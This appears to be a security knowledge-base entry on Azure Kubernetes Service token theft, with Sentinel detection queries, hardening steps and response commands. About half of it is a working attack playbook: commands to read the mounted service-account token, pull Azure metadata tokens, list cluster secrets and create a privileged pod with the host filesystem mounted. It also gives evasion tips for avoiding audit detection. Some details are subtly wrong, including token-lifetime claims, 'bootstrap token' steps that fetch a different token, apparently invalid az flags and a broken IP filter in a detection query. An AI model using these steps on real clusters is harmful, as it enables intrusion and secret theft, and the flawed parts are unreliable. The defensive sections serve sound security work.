# [LM-AUTH-030]: AKS Service Account Token Theft

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-030 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access / Lateral Movement |
| **Platforms** | Entra ID, Azure Kubernetes Service (AKS) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Kubernetes 1.18+, AKS all versions |
| **Patched In** | N/A (Requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

- **Concept:** Kubernetes automatically mounts service account tokens to containers by default, allowing processes within pods to authenticate to the Kubernetes API server. When a container is compromised, attackers can extract this token from the pod's filesystem (typically at `/var/run/secrets/kubernetes.io/serviceaccount/token`) and use it to interact with the Kubernetes API. This grants the attacker the permissions of that service account, enabling lateral movement across the cluster, secret enumeration, and further resource compromise.

- **Attack Surface:** The service account token mounted on every pod; the Kubernetes API server (typically accessible at `https://kubernetes.default.svc.cluster.local:443` from within the cluster); the instance metadata service (Azure WireServer) for retrieving bootstrap tokens in AKS environments.

- **Business Impact:** **Complete cluster compromise possible.** An attacker with a compromised service account token can enumerate all resources in the cluster, steal secrets stored in `etcd`, pivot to other namespaces, create new workloads with malicious code, exfiltrate data, or launch denial-of-service attacks. If the compromised pod has broad permissions (e.g., cluster-admin), the attacker gains administrative control of the entire Kubernetes cluster.

- **Technical Context:** This attack typically occurs in under 60 seconds once container access is established. Detection is difficult because legitimate Kubernetes components regularly access the API using service account tokens. The attack leaves minimal forensic evidence unless API audit logging is enabled.

### Operational Risk

- **Execution Risk:** Low – Token extraction is trivial once pod access is achieved. No special tools or privileges required beyond pod compromise.
- **Stealth:** Medium – Access to the Kubernetes API using a legitimate token is difficult to distinguish from normal cluster operations unless audit logging is enabled.
- **Reversibility:** No – Stolen tokens can be used indefinitely until the service account is deleted or token secrets are rotated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.5 | Ensure that default service accounts are not actively used |
| **CIS Benchmark** | 5.2.2 | Minimize the admission of containers wishing to share the host IPC namespace |
| **DISA STIG** | V-254380 | Disable automounting of service account tokens |
| **CISA SCuBA** | Configuration E.1 | Disable automatic service account token mounting |
| **NIST 800-53** | AC-3 | Access Enforcement |
| **NIST 800-53** | SC-7 | Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing |
| **DORA** | Art. 9 | Protection and Prevention of Threats |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Compromise of Container Orchestration Platform |

---

## 3. Detailed Execution Methods

### METHOD 1: Direct Token Extraction from Pod Filesystem (Container Compromise)

**Supported Versions:** Kubernetes 1.18+, AKS all versions (default configuration)

#### Step 1: Achieve Pod Compromise
**Objective:** Gain shell access to a running container within the AKS cluster.

**Prerequisite Tactics:**
- Container image contains a vulnerability (e.g., web application RCE)
- Supply chain compromise (malicious base image)
- Exposed service without authentication
- Malicious container deployment with operator access

**Command (Linux Container):**
```bash
# Assuming you have shell access to the container via RCE, kubectl exec, or docker exec
# List the mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IklGMWZzYWRmN2R...
```

**What This Means:**
- This is a Base64-encoded JWT token signed with the Kubernetes cluster's private key
- The token is automatically refreshed by the kubelet; it is long-lived (typically valid for the lifetime of the service account)
- The token grants API access with the permissions of that service account (likely limited to the current namespace by default)

**OpSec & Evasion:**
- Token extraction from the filesystem does not generate any audit logs (it's a local file read)
- Using the token requires network access to the Kubernetes API server; attempts to interact with the API will be logged if audit logging is enabled
- To avoid detection, avoid making suspicious API calls (e.g., listing secrets, creating privileged pods)
- Detection likelihood: Low for token extraction, Medium-High for API usage

**Troubleshooting:**
- **Error:** `Permission denied: /var/run/secrets/kubernetes.io/serviceaccount/token`
  - **Cause:** Token file does not exist or process lacks read permissions
  - **Fix:** Verify the container has `automountServiceAccountToken: true` (default) in the pod spec
  - **Fix:** Run as a non-root user that has read access to the token file

**References & Proofs:**
- [Kubernetes Documentation: Managing Service Accounts](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes API Server Authentication](https://kubernetes.io/docs/concepts/security/service-accounts/)
- [4Armed: Kubernetes Privilege Escalation via TLS Bootstrap Token Stealing](https://www.4armed.io/blog/kubernetes-privilege-escalation/)

---

#### Step 2: Extract KUBELET Bootstrap Token (AKS-Specific)

**Objective:** In AKS, pods sharing the host network namespace can access the Azure WireServer metadata service, which provides bootstrap tokens with elevated privileges.

**Version Note:** This technique is specific to Azure Kubernetes Service (AKS). It does NOT work on GKE or self-managed Kubernetes clusters.

**Command (Host Network Pod):**
```bash
# From within a pod with hostNetwork: true
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com" \
  -H "Metadata:true" | jq '.access_token' -r

# Alternatively, query for the bootstrap token (if accessible)
curl -s "http://168.63.129.16/metadata/instance?api-version=2021-02-01" \
  -H "Metadata:true" | jq .
```

**Expected Output:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjE4MjcyMjJkO...
```

**What This Means:**
- This is a short-lived managed identity access token (typically valid for 1 hour)
- The token is scoped to the Azure management plane (management.azure.com)
- Using this token, the attacker can list resources, access storage accounts, and potentially escalate to the entire Azure subscription

**OpSec & Evasion:**
- Querying the WireServer metadata service requires network access from the pod; this is typically allowed by default
- Metadata service queries may be logged in Azure Monitor/NSGs if network diagnostic settings are enabled
- To minimize detection, avoid excessive queries and immediately use the token rather than repeated requests
- Detection likelihood: Low-Medium

**Troubleshooting:**
- **Error:** `curl: (7) Failed to connect to 169.254.169.254`
  - **Cause:** Pod is not running with `hostNetwork: true` or the metadata service is restricted
  - **Fix:** Pod must be explicitly configured with `hostNetwork: true` in the pod spec
  - **Cause (Alternative):** Network policies may be blocking access to the metadata service
  - **Fix:** Check for Calico/Azure Network Policy rules restricting egress to 169.254.169.254

**References & Proofs:**
- [Azure Kubernetes Service - Accessing Instance Metadata](https://learn.microsoft.com/en-us/azure/aks/concepts-security#pod-security)
- [Synacktiv: So I became a node: exploiting bootstrap tokens in AKS](https://www.synacktiv.com/publications/so-i-became-a-node-exploiting-bootstrap-tokens-in-azure-kubernetes-service)
- [Azure Instance Metadata Service Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)

---

#### Step 3: Use Token to Query Kubernetes API

**Objective:** Authenticate to the Kubernetes API server using the stolen token to enumerate cluster resources and exfiltrate sensitive data.

**Command (From Compromised Pod or External Machine):**
```bash
# Set the token variable
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc.cluster.local:443

# Test connectivity to the API server
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces

# List all pods in the current namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods

# Attempt to list secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets

# If service account has cluster-wide permissions, enumerate all secrets across namespaces
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets
```

**Expected Output:**
```json
{
  "apiVersion": "v1",
  "items": [
    {
      "apiVersion": "v1",
      "data": {
        "password": "c3VwZXJzZWNyZXQxMjM=",
        "username": "YWRtaW4="
      },
      "kind": "Secret",
      "metadata": {
        "name": "db-credentials",
        "namespace": "default"
      },
      "type": "Opaque"
    }
  ],
  "kind": "SecretList",
  "metadata": {
    "resourceVersion": "123456"
  }
}
```

**What This Means:**
- The API server returned secrets in the namespace, indicating the service account has `get secrets` permission
- The `data` field in Kubernetes secrets is Base64-encoded, NOT encrypted – any tool can decode it
- The attacker can now decode and use these credentials to access databases, external systems, and other resources

**OpSec & Evasion:**
- Every API call to the Kubernetes API server is logged if `--audit-log-maxage` is configured
- To avoid detection, avoid common enumeration queries; instead, make targeted queries for specific resources you know exist
- Use `kubectl` with the token (via `--token` flag) rather than raw curl to appear more legitimate
- Alternatively, use the token from a geographically distant or spoofed source IP
- Detection likelihood: High if audit logging is enabled, Low if audit logging is disabled

**Troubleshooting:**
- **Error:** `{  "kind": "Status",  "apiVersion": "v1",  "metadata": {},  "status": "Failure",  "message": "secrets is forbidden",  "reason": "Forbidden"}`
  - **Cause:** The service account does not have `get` permissions on the `secrets` resource
  - **Fix:** The attack is still successful if other resources can be accessed (pods, deployments, configmaps)
  - **Fix (Alternative):** Attempt to use the token to access resources in other namespaces or escalate to a higher-privileged service account

**References & Proofs:**
- [Kubernetes API Reference: Secrets](https://kubernetes.io/docs/reference/kubernetes-api/config-and-storage-resources/secret-v1/)
- [OWASP Kubernetes API Security](https://owasp.org/www-project-kubernetes-top-ten/)
- [SpecterOps: Attacking Kubernetes: Part 1 – Reconnaissance](https://specterops.io/blog/attacking-kubernetes-part-1-reconnaissance/)

---

#### Step 4: Create Privileged Pod for Cluster Escalation (Optional)

**Objective:** Use API access to create a new pod with elevated privileges (if service account has pod creation permission), enabling further escalation or persistence.

**Command (Using stolen token):**
```bash
# Create a malicious pod spec
cat > /tmp/evil-pod.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privilege-escalation-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: shell
    image: ubuntu:22.04
    securityContext:
      privileged: true
      runAsUser: 0
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Submit the pod using the stolen token
curl -k -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -d @/tmp/evil-pod.yaml \
  https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/pods

# Exec into the pod (if you have pod creation permissions, you likely have exec permissions)
curl -k -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -N -T /dev/stdin \
  "https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/pods/privilege-escalation-pod/exec?command=bash&stdin=true&stdout=true&stderr=true&tty=true"
```

**Expected Output:**
```
pod/privilege-escalation-pod created
# Interactive shell access to the host filesystem
root@privilege-escalation-pod:/#
```

**What This Means:**
- A privileged pod with access to the host root filesystem (`/host`) has been created
- The attacker now has root access to the underlying Kubernetes node, enabling attacks on other pods running on that node, container runtime compromise, and persistence mechanisms

**OpSec & Evasion:**
- Creating pods generates audit log entries; the pod manifest is logged in plaintext
- To avoid detection, name the pod something inconspicuous (not "evil-pod" or "malware"); consider using names similar to legitimate monitoring tools
- Use an image from a well-known registry (e.g., `ubuntu:22.04` or `redis:latest`) to blend in with normal workloads
- Detection likelihood: High with audit logging enabled, Medium-High without (pod will be visible in cluster)

**Troubleshooting:**
- **Error:** `{  "kind": "Status",  "apiVersion": "v1",  "metadata": {},  "status": "Failure",  "message": "pods is forbidden",  "reason": "Forbidden"}`
  - **Cause:** The service account does not have pod creation permissions
  - **Fix:** The attack succeeds with read-only access (enumeration); escalation requires additional compromises

**References & Proofs:**
- [Kubernetes API Reference: Pod Specification](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)
- [CIS Kubernetes Benchmark: Pod Security Standards](https://www.cisecurity.org/benchmark/kubernetes)
- [SpecterOps: Attacking Kubernetes: Part 3 – Post-Exploitation](https://specterops.io/blog/attacking-kubernetes-part-3-post-exploitation/)

---

### METHOD 2: Using kubectl with Stolen Token

**Supported Versions:** Kubernetes 1.18+, all versions

#### Step 1: Configure kubectl Context with Stolen Token

**Objective:** Set up a local `kubectl` client to use the stolen token for authentication, enabling command-line interaction with the cluster.

**Command:**
```bash
# Extract the token from the pod
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export API_SERVER="https://kubernetes.default.svc.cluster.local:443"
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Create a kubeconfig file with the stolen token
cat > /tmp/kubeconfig <<EOF
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJ... # (Base64-encoded CA cert)
    server: https://your-aks-cluster.hcp.eastus.azmk8s.io:443
  name: your-aks-cluster
contexts:
- context:
    cluster: your-aks-cluster
    namespace: $NAMESPACE
    user: service-account
  name: default
current-context: default
users:
- name: service-account
  user:
    token: $TOKEN
EOF

# Use the kubeconfig to interact with the cluster
export KUBECONFIG=/tmp/kubeconfig
kubectl get pods
kubectl get secrets
kubectl exec -it <pod-name> -- /bin/bash
```

**Expected Output:**
```
NAME                    READY   STATUS    RESTARTS   AGE
my-application-7d9f8c   1/1     Running   0          2d
database-pod-5c8b6f     1/1     Running   1          5d
```

**What This Means:**
- The kubectl client is now authenticated to the cluster using the stolen token
- All subsequent kubectl commands will use this token for authentication
- The attacker can interact with the cluster as if they were the service account

**OpSec & Evasion:**
- kubectl commands may be logged by process logging (e.g., auditd, Windows Event Log)
- To minimize visibility, run kubectl from a container or ephemeral instance
- Avoid using kubectl with verbose flags (`-v`) which may be logged
- Detection likelihood: Medium (depends on endpoint monitoring)

**Troubleshooting:**
- **Error:** `error: unable to get API server...`
  - **Cause:** API server address is incorrect or unreachable
  - **Fix:** Obtain the correct API server URL from the AKS cluster details (e.g., `az aks show --name <cluster-name> --query fqdn`)

**References & Proofs:**
- [kubectl Documentation](https://kubernetes.io/docs/reference/kubectl/)
- [Kubernetes RBAC - Service Account Token Authentication](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)

---

### METHOD 3: Exploiting Bootstrap Tokens in AKS (Advanced)

**Supported Versions:** AKS (Azure Kubernetes Service) running Kubernetes 1.18+

#### Step 1: Access Azure WireServer for Bootstrap Token

**Objective:** In AKS environments, retrieve a bootstrap token with elevated privileges from the Azure Instance Metadata Service.

**Prerequisite:** The pod must be running with `hostNetwork: true` to access the metadata service.

**Command:**
```bash
# Query the Azure Instance Metadata Service
WIRESERVER="http://168.63.129.16/"
IMDS_TOKEN=$(curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com" | jq -r '.access_token')

# Decode and inspect the token (JWT structure)
echo $IMDS_TOKEN | cut -d'.' -f2 | base64 -d | jq .

# Use the token to access Azure resources
curl -s -H "Authorization: Bearer $IMDS_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
```

**Expected Output:**
```json
{
  "aud": "https://management.azure.com",
  "iss": "https://sts.windows.net/12345678-1234-1234-1234-123456789012/",
  "iat": 1234567890,
  "nbf": 1234567890,
  "exp": 1234571490,
  "aio": "E2RgYIg/12345+abcde/ABCD==",
  "appid": "00000000-0000-0000-0000-000000000000",
  "appidacr": "2",
  "idp": "https://sts.windows.net/12345678-1234-1234-1234-123456789012/",
  "oid": "87654321-4321-4321-4321-210987654321",
  "rh": "0.ARoA1234567...",
  "sub": "87654321-4321-4321-4321-210987654321",
  "tid": "12345678-1234-1234-1234-123456789012",
  "uti": "abcdefghijklmnop",
  "ver": "1.0"
}
```

**What This Means:**
- The token is valid for accessing Azure management APIs
- The `tid` (tenant ID) and `oid` (object ID) identify the managed identity associated with the node
- Using this token, the attacker can query and access Azure resources (storage, databases, key vaults, etc.)

**OpSec & Evasion:**
- Metadata service queries may be logged in Azure Monitor; minimize queries to only what is necessary
- The token has a short lifetime (typically 1 hour); use it immediately
- Detection likelihood: Medium-High if Azure logging is enabled

**Troubleshooting:**
- **Error:** `curl: (7) Failed to connect to 169.254.169.254`
  - **Cause:** Pod is not running with `hostNetwork: true`
  - **Fix:** Requires pod to have host network access; verify pod spec includes `hostNetwork: true`

**References & Proofs:**
- [Synacktiv: So I became a node](https://www.synacktiv.com/publications/so-i-became-a-node-exploiting-bootstrap-tokens-in-azure-kubernetes-service)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [Google Cloud Blog: WireServing Up Credentials](https://cloud.google.com/blog/topics/threat-intelligence/escalating-privileges-azure-kubernetes-services)

---

## 4. Attack Simulation & Verification (Atomic Red Team)

### Atomic Red Team Test for T1528

- **Test Name:** Kubernetes Service Account Token Theft
- **Test ID:** T1528-AKS-001
- **Description:** Simulate extraction of Kubernetes service account tokens from a compromised container and use them to interact with the Kubernetes API.
- **Supported Versions:** Kubernetes 1.18+, AKS all versions

**Command (Atomic Simulation):**
```bash
# Simulate a compromised pod environment
docker run --rm -v $HOME/.kube:/root/.kube ubuntu:22.04 bash -c '
  # Extract token from volume mount (simulating token theft)
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "token-not-mounted")
  echo "Stolen Token: $TOKEN"
  
  # Attempt API access
  curl -k -s -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces 2>&1 | head -20
'
```

**Reference:** 
- [Atomic Red Team T1528](https://github.com/redcanaryco/atomic-red-team)
- [Peirates GitHub Repository](https://github.com/inguardians/peirates) – Kubernetes attack tool simulating token theft

---

## 5. Tools & Commands Reference

### Peirates
**Version:** 1.1.8+  
**Minimum Version:** 1.0  
**Supported Platforms:** Linux, macOS, Windows (WSL)  
**URL:** https://github.com/inguardians/peirates

**Installation:**
```bash
git clone https://github.com/inguardians/peirates.git
cd peirates
go build -o peirates main.go
./peirates --help
```

**Usage:**
```bash
# Run Peirates in interactive mode
./peirates

# List available service account tokens
> available_pods
> steal_token
> kubectl_commands
```

---

### kubectl
**Version:** v1.28+  
**Minimum Version:** v1.18  
**Supported Platforms:** All (Linux, macOS, Windows)  
**URL:** https://kubernetes.io/docs/tasks/tools/

**Installation:**
```bash
# macOS
brew install kubectl

# Linux
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/

# Windows
choco install kubernetes-cli
```

**Usage:**
```bash
# Set kubeconfig with stolen token
export KUBECONFIG=/tmp/kubeconfig
kubectl get pods
kubectl get secrets
kubectl exec -it <pod> -- /bin/bash
```

---

### curl (with Authentication Headers)
**Version:** 7.0+  
**Installation:** Typically pre-installed on Linux/macOS; available for Windows

**Usage:**
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces
```

---

## 6. Microsoft Sentinel Detection

### Query 1: Unusual Kubernetes API Access using Service Account Token

**Rule Configuration:**
- **Required Table:** `KubeAudit` (if audit logging enabled)
- **Required Fields:** `username`, `verb`, `objectRef`, `sourceIPs`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To:** AKS clusters with audit logging enabled

**KQL Query:**
```kusto
KubeAudit
| where verb in ("get", "list") and objectRef.resource == "secrets"
| where username has "system:serviceaccount"
| where sourceIPs != "10.0.0.0/8" and sourceIPs != "172.16.0.0/12"  // Exclude internal cluster IPs
| summarize count() by username, objectRef.namespace, sourceIPs
| where count_ > 5  // Threshold: more than 5 secret list operations
| project-reorder username, objectRef_namespace=objectRef.namespace, sourceIPs, count_
```

**What This Detects:**
- Excessive enumeration of secrets using a service account token (legitimate apps do not repeatedly list secrets)
- API calls originating from external IPs (not from within the cluster)
- Unusual patterns of API access by service accounts

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Unusual Kubernetes Secret Enumeration via Service Account Token`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Unusual Kubernetes Secret Enumeration" `
  -Query @"
KubeAudit | where verb in ("get", "list") and objectRef.resource == "secrets"
| where username has "system:serviceaccount"
| where sourceIPs != "10.0.0.0/8" and sourceIPs != "172.16.0.0/12"
| summarize count() by username, objectRef.namespace, sourceIPs
| where count_ > 5
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Kubernetes Monitoring](https://learn.microsoft.com/en-us/azure/sentinel/data-connectors)

---

### Query 2: Service Account Token Extraction Attempts

**Rule Configuration:**
- **Required Table:** `ContainerImageInventory`, `ContainerProcessEvents`
- **Required Fields:** `containerName`, `process.name`, `process.commandLine`
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** AKS clusters with Defender for Containers enabled

**KQL Query:**
```kusto
ContainerProcessEvents
| where process.name in ("cat", "dd", "cp") 
  and process.commandLine has "/var/run/secrets/kubernetes.io/serviceaccount/token"
| project TimeGenerated, ContainerName=containerName, Process=process.name, Command=process.commandLine
| join kind=inner (
  KubeAudit | where verb == "exec" and objectRef.resource == "pods"
) on $left.ContainerName == $right.objectRef.name
```

**What This Detects:**
- Attempts to read or copy the service account token file from within a container
- Followed immediately by API access (exec verb in KubeAudit)

**Source:** [Microsoft Defender for Containers Detection](https://learn.microsoft.com/en-us/azure/defender-for-cloud/container-security)

---

## 7. Defensive Mitigations

### Priority 1: CRITICAL

- **Disable Automatic Service Account Token Mounting:** Prevent the kubelet from automatically mounting service account tokens to pods that do not need them.

  **Pod YAML Configuration (Pod Security Standard):**
  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: example-pod
  spec:
    serviceAccountName: example-sa
    automountServiceAccountToken: false  # Disable token mounting
    containers:
    - name: app
      image: my-app:latest
  ```

  **Manual Steps (Cluster-wide via Pod Security Standards):**
  1. Open **Azure Portal** → **Kubernetes Services** → **Your AKS Cluster**
  2. Go to **Security** → **Pod Security Standards**
  3. Enable **Restricted** or **Baseline** policy to enforce `automountServiceAccountToken: false`
  4. Click **Apply**

  **Manual Steps (PowerShell):**
  ```powershell
  # Update cluster to enforce Pod Security Standards
  az aks update --resource-group myResourceGroup --name myAKSCluster `
    --enable-managed-identity --pod-security-policy-enforce restricted
  ```

  **Version Note:** Kubernetes 1.23+ supports Pod Security Standards; earlier versions require Pod Security Policies (deprecated in 1.25+)

- **Implement Network Policies:** Restrict egress from pods to the Kubernetes API server, allowing only necessary services to communicate with the API.

  **Network Policy Configuration (Calico):**
  ```yaml
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: restrict-api-access
    namespace: default
  spec:
    podSelector: {}  # Apply to all pods in namespace
    policyTypes:
    - Egress
    egress:
    - to:
      - podSelector:
          matchLabels:
            k8s-app: kube-dns
      ports:
      - protocol: UDP
        port: 53
    - to:
      - namespaceSelector: {}
        podSelector:
          matchLabels:
            k8s-app: kubernetes-dashboard
  ```

  **Manual Steps (Azure Portal):**
  1. Go to **AKS Cluster** → **Networking** → **Network Policies**
  2. Select **Enable Azure Network Policies** or **Calico**
  3. Create a policy denying egress to `kubernetes.default.svc.cluster.local:443` for non-system pods
  4. Click **Apply**

- **Enable Kubernetes Audit Logging:** Configure audit logging to detect and log all API server access, including token usage.

  **Manual Steps (Azure Portal):**
  1. Navigate to **AKS Cluster** → **Monitoring** → **Diagnostic Settings**
  2. Click **+ Add diagnostic setting**
  3. Enable **kube-audit-admin** and **kube-audit** logs
  4. Send logs to a Log Analytics Workspace or Storage Account
  5. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  az aks update --resource-group myResourceGroup --name myAKSCluster `
    --enable-managed-identity --enable-pod-security-policy
  
  # Enable audit logging to Log Analytics
  az aks update --resource-group myResourceGroup --name myAKSCluster `
    --workspace-resource-id /subscriptions/{subscriptionId}/resourcegroups/{resourceGroup}/providers/microsoft.operationalinsights/workspaces/{workspaceName}
  ```

### Priority 2: HIGH

- **Use Azure Key Vault for Secrets Management:** Instead of storing secrets in Kubernetes secrets, use Azure Key Vault with managed identities for RBAC-based access.

  **Configuration (Azure Workload Identity Addon):**
  ```yaml
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: workload-identity-sa
    namespace: default
    annotations:
      azure.workload.identity/client-id: <client-id>
  ---
  apiVersion: v1
  kind: Pod
  metadata:
    name: keyvault-pod
    namespace: default
    labels:
      azure.workload.identity/use: "true"
  spec:
    serviceAccountName: workload-identity-sa
    containers:
    - name: app
      image: my-app:latest
      env:
      - name: AZURE_CLIENT_ID
        value: <client-id>
      - name: AZURE_TENANT_ID
        value: <tenant-id>
      - name: AZURE_FEDERATED_TOKEN_FILE
        value: /var/run/secrets/workload.azure.com/serviceaccount/token
  ```

  **Manual Steps (Azure Portal):**
  1. Go to **AKS Cluster** → **Cluster Configuration** → **Workload Identity**
  2. Enable **Workload Identity**
  3. Create a user-assigned managed identity in **Managed Identities**
  4. Assign Key Vault access via **Access Policies**
  5. Configure pods with the above YAML

- **Enforce RBAC on Service Accounts:** Limit service account permissions to only the minimum required resources and verbs.

  **RBAC Configuration (ClusterRole):**
  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: minimal-role
  rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get"]
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: minimal-binding
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: minimal-role
  subjects:
  - kind: ServiceAccount
    name: my-app-sa
    namespace: default
  ```

  **Manual Steps (kubectl):**
  ```bash
  # Create a minimal role and bind it to a service account
  kubectl create clusterrole minimal-role --verb=get,list --resource=pods
  kubectl create clusterrolebinding minimal-binding --clusterrole=minimal-role --serviceaccount=default:my-app-sa
  ```

### Access Control & Policy Hardening

- **Enable Pod Security Standards:** Enforce security policies at the cluster level to restrict privileged pod creation.

  **Manual Steps (Azure Portal):**
  1. Navigate to **AKS Cluster** → **Security** → **Pod Security Standards**
  2. Set the enforcement mode to **Restricted** or **Baseline**
  3. Apply policies to all namespaces
  4. Click **Apply**

- **Implement Admission Controllers:** Use OPA Gatekeeper or Azure Policy to enforce pod security policies.

  **OPA Gatekeeper Example:**
  ```rego
  # Deny pods with automountServiceAccountToken: true (except system pods)
  deny[msg] {
    input.request.kind.kind == "Pod"
    input.request.object.spec.automountServiceAccountToken == true
    not is_system_namespace
    msg := "Service account token auto-mounting is not allowed"
  }

  is_system_namespace {
    input.request.namespace == "kube-system"
  }
  ```

  **Manual Installation (Helm):**
  ```bash
  helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts
  helm install gatekeeper/gatekeeper --name-template=gatekeeper --namespace gatekeeper-system --create-namespace
  ```

### Validation Command (Verify Fix)

```bash
# Check if service account token auto-mounting is disabled for a pod
kubectl get pod <pod-name> -o jsonpath='{.spec.automountServiceAccountToken}'
# Expected output: false

# Verify audit logging is enabled
az aks show --name <cluster-name> --resource-group <resource-group> --query addonProfiles.omsagent.enabled
# Expected output: true

# Verify network policies are in place
kubectl get networkpolicies --all-namespaces
# Expected output: List of network policies
```

**What to Look For:**
- Pods should have `automountServiceAccountToken: false` unless they explicitly require API access
- Audit logging should be active and forwarding logs to Log Analytics
- Network policies should restrict API access to only necessary services

---

## 8. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Files:** `/var/run/secrets/kubernetes.io/serviceaccount/token` (read operations on containers)
- **Kubernetes API:** Unusual `GET`/`LIST` operations on `secrets`, `pods`, `configmaps` resources
- **Network:** Outbound connections from pods to `kubernetes.default.svc.cluster.local:443` from non-system pods
- **Azure Metadata:** Queries to `169.254.169.254` (Azure IMDS) from pods with `hostNetwork: true`

### Forensic Artifacts

- **Kubernetes Audit Logs:** `kube-audit` and `kube-audit-admin` logs in `/var/log/kube-audit*` or Azure Log Analytics (table: `KubeAudit`)
- **Container Logs:** Shell command history in compromised containers (e.g., `.bash_history`, `.sh_history`)
- **Azure Monitor:** Logs in `AzureDiagnostics` table showing API calls using the service account principal

### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```bash
   # Delete the compromised pod
   kubectl delete pod <compromised-pod> --namespace <namespace> --grace-period=0 --force
   
   # Block the service account (revoke credentials)
   kubectl delete serviceaccount <sa-name> --namespace <namespace>
   ```
   **Manual (Azure Portal):**
   - Go to **AKS Cluster** → **Workloads** → **Pods**
   - Select the compromised pod → **Delete**

2. **Collect Evidence (First Hour):**
   **Command:**
   ```bash
   # Export pod logs
   kubectl logs <compromised-pod> --namespace <namespace> > /evidence/pod-logs.txt
   
   # Export audit logs
   az aks get-credentials --name <cluster-name> --resource-group <resource-group>
   kubectl get events --namespace <namespace> --sort-by='.lastTimestamp' > /evidence/events.txt
   
   # Collect Azure diagnostic logs
   az monitor log-analytics query --workspace-id <workspace-id> \
     --analytics-query "KubeAudit | where username has '<service-account>' | project TimeGenerated, verb, objectRef, sourceIPs"
   ```
   **Manual:**
